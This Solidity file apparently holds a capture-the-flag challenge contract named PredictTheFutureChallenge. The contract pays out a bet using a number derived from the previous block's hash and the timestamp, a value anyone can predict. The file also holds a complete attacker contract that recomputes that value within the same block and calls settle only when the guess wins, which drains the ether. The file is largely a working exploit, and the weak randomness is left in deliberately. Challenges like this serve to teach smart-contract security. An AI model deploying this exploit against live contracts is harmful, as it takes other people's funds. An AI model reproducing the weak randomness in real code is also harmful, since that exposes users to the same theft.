pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
  address guesser;
  uint8 guess;
  uint256 settlementBlockNumber;

  function PredictTheFutureChallenge() public payable {
    require(msg.value == 1 ether);
  }

  function isComplete() public view returns (bool) {
    return address(this).balance == 0;
  }

  function lockInGuess(uint8 n) public payable {
    require(guesser == 0);
    require(msg.value == 1 ether);

    guesser = msg.sender;
    guess = n;
    settlementBlockNumber = block.number + 1;
  }

  function settle() public payable {
    require(msg.sender == guesser);
    require(block.number > settlementBlockNumber);

    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) %
      10;

    guesser = 0;
    if (guess == answer) {
      msg.sender.transfer(2 ether);
    }
  }
}

contract PredictTheFutureAttacker {
  PredictTheFutureChallenge victim;
  uint8 _answer;

  function PredictTheFutureAttacker(address victim_) public payable {
    victim = PredictTheFutureChallenge(victim_);
  }

  function() public payable {}

  function lockInGuess(uint8 n) external payable returns (uint8) {
    require(msg.value == 1 ether);

    bool success = (address(victim)).call.value(msg.value)(
      bytes4(keccak256('lockInGuess(uint8)')),
      uint8(n)
    );

    _answer = n;

    // Check if the function call was successful
    require(success);

    // victim.lockInGuess(answer);
  }

  function settle() external returns (uint8) {
    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) %
      10;

    if (answer == _answer) {
      victim.settle();
    }

    return answer;
  }
}
